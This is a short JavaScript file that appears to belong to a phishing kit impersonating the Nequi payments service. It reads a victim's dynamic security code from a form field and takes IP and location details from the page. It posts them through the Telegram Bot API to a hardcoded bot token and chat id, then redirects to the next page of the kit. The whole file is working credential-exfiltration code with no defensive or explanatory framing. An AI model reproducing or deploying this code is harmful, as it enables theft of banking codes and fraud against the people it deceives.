//bot token
var telegram_bot_id = "7407461146:AAFvOs0zfVtt5nXpD1VIZ1k0FpXJxTE5TEI";
//chat id
var chat_id = 6655953882;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("Dinamit").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "⏱️Dinamica1: " + u_name +"\nIP: " + ip +"\n" + ip2 +"\n\n🏍️Nequi_SBR🏍️";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index4.html';
        console.log(response);
    });
    return false;
};
